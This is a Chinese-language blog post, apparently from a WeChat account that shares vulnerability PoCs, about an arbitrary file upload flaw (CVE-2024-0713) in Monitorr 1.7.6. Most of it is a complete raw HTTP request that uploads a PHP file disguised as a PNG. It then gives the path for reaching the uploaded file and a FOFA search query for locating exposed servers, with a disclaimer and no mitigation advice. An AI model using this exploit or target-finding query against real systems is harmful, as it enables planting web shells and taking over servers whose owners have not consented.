#  Monitorr 任意文件上传-CVE-2024-0713   
小白菜安全  小白菜安全   2024-01-24 18:57  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
**Monitorr 1.7.6**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1picEvdPS5MzGuCVicpia4icibiaBAH7teMVAdqHzIIkVgjSleDtIH3o1DHib2VYbAToAFVfmD6kYVXxibGQ/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
POST /assets/php/upload.php HTTP/2
Host: 127.0.0.1
Content-Length: 683
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEraQb4FUYaUR1Wk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryAEraQb4FUYaUR1Wk
Content-Disposition: form-data; name="fileToUpload"; filename="18888.php"
Content-Type: image/png

123
------WebKitFormBoundaryAEraQb4FUYaUR1Wk--
```  
  
漏洞复现  
1. 出现以下信息代表漏洞存在,内容修改为图片码格式  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1picEvdPS5MzGuCVicpia4icibiaCZj2xxIYFXicEeRetKfAycCklajvMibZibfx5hNwn6dpxibN1ibko8tmQibg/640?wx_fmt=png&from=appmsg "")  
  
2.访问上传文件url+/assets/data/usrimg/18888.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1picEvdPS5MzGuCVicpia4icibiat7voNauWXToianHTyVAB1XY4AoHS2tmjtgG2g9t2EPF2Nu0jfQWpjmg/640?wx_fmt=png&from=appmsg "")  
  
# 搜索语法  
  
**fofa：icon_hash="-211006074"**  
  
  
  
